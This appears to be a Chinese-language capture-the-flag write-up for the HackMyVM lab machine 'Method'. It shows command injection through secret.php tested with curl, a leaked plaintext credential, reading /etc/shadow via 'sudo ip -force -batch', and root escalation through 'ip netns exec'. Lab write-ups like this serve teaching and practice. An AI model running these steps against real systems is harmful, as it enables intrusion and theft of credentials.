# Method

2024.12.31 https://hackmyvm.eu/machines/machine.php?vm=Method

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

扫描 80 web 服务，发现 http://192.168.5.40/note.txt :

```
just find three kings of blues
then move to the crossroads
-------------------------------
-abuzerkomurcu
```

http://192.168.5.40/index.htm 发现其中有参数:HackMyVM 并且提交到了 secret.php

http://192.168.5.40/secret.php 跳转到了一个图片 https://images-na.ssl-images-amazon.com/images/I/31YDo0l4ZrL._SX331_BO1,204,203,200_.jpg 从图片中没找到隐写信息。

对这个 secret.php 页面进行提交，看看是否有 rce：

```
curl http://192.168.5.40/secret.php -d 'HackMyVM=ls'
```

发现可以命令执行，直接反弹 shell。

直接得到了 user flag:

```
www-data@method:/home/prakasaka$ cat uSeR.txt
e4408105ca9c2a5c2714a818c475d06F
```

在 secret.php 中发现了用户凭据：

```
$ok="prakasaka:th3-!llum!n@t0r";
```

切换到 prakasaka 用户，sudo -l 发现：

```
(!root) NOPASSWD: /bin/bash
(root) /bin/ip
```

使用 sudo ip 读取 /etc/shadow 文件：

```
sudo ip -force -batch /etc/shadow

root:$y$j9T$yE6jN0atwMbWnXRq0EM4a.$XBuLCI7wuKHbL35hX6OAf7C4jFDp/hypsQUj8nDnBt6:18923:0:99999:7:::
```

但是哈希有问题，破解不出来，使用 GTOF 中另外一种方式：

```
sudo ip netns add foo
sudo ip netns exec foo /bin/sh
```

得到了 root flag:

```
# cat rOot.txt
fc9c6eb6265921315e7c70aebd22af7F
```
